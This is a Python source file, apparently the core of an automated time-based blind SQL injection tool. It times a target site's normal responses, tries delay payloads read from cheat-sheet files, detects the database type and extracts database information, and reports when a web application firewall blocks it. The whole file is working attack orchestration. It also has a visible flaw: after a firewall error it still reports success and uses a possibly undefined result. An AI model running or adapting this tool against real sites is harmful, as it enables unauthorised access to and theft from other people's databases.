# from encodings import normalize_encoding
from typing import Iterable, TypeVar
from requests import Response
from datetime import datetime, timedelta
from multiprocessing.pool import ThreadPool
from injector import NoTypeDetectedError
from search.getexable import GetExAble, NoExableError

from web import Link, ExploitLink
from dbtype import DBType

import injector
import getinfo

from p_dbinfo import p_dbinfo


import time





DEFAULT_ERR_RANGE = 1.5
DEFAULT_DELAY_TIME = 2


T = TypeVar('T')


def read_cheatsheet(cheatsheet_path: str) -> list[str]:
    with open(f"{cheatsheet_path}/delay_command.txt", 'r', newline="") as f:
        delay_command = f.read().splitlines()
    with open(f"{cheatsheet_path}/form.txt", 'r', newline="") as f:
        form = f.read().splitlines()
    return form, delay_command
    

def aver(something: Iterable[T]) -> T:  
    _iter = iter(something)
    sum = next(_iter)
    c = 1
    for i in _iter:
        sum += i
        c += 1
    return sum/c


class SQLi:
    
    err_range: float
    delay_time: float
    normal_elapsed: timedelta

    def __init__(self,
            err_range: float = DEFAULT_ERR_RANGE,
            delay_time: float = DEFAULT_DELAY_TIME
            ) -> None:
        self.err_range = err_range
        self.delay_time = delay_time

    
    def run(self, link: Link, cheatsheet: tuple[list[str], list[str]], argstime):
        self.delay_time = argstime
        self.normal_elapsed = aver(link.request().elapsed for _ in range(10))
        print('\033[32m'+'[{0}] Site Average Response Time => {1}\n'.format(time.strftime('%X'), self.normal_elapsed)+'\033[0m')

        try:
            exploitable_link = GetExAble(self.is_exed).run(link, cheatsheet, self.delay_time)
        except NoExableError:
            print('\033[31m'+'[{0}] No Exploitable Payload Detected'.format(time.strftime('%X'))+'\033[0m')
            return None, None
        print('\033[32m'+'[{0}] Inject Succeeded => {1}={2!r}\n'.format(time.strftime('%X'), exploitable_link.ex_key, exploitable_link.ex_payload)+'\033[0m')

        try:
            dbtype = injector.Injector(injector.DefaultHttpClient()).findType(link.url, link.method, exploitable_link.ex_key, exploitable_link.ex_delay_command, exploitable_link.ex_form)
        except NoTypeDetectedError:
            print('\033[31m'+'[{0}] No Database Type Detected'.format(time.strftime('%X'))+'\033[0m')
            return None, None
        print('\033[32m'+'[{0}] Database Type => {1}\n'.format(time.strftime('%X'), dbtype.name)+'\033[0m')

        try:
            dbinfo = getinfo.GetInfo(self.is_exed, getinfo.Payload(exploitable_link, exploitable_link.ex_key, exploitable_link.ex_payload, exploitable_link.ex_form, exploitable_link.ex_delay_command), dbtype).attack()
        except getinfo.WAFFilterError:
            print('\033[31m'+'[{0}] Unable to Obtain Information: Probably blocked by a firewall'.format(time.strftime('%X'))+'\033[0m')
        print('\033[32m'+'[{0}] Database Information Acquisition Succeeded'.format(time.strftime('%X'))+'\033[0m')

        p_dbinfo(dbinfo)

        return dbtype, dbinfo


    def is_exed(self, tryed: Response) -> bool:
        return self.normal_elapsed+timedelta(seconds=self.err_range) < tryed.elapsed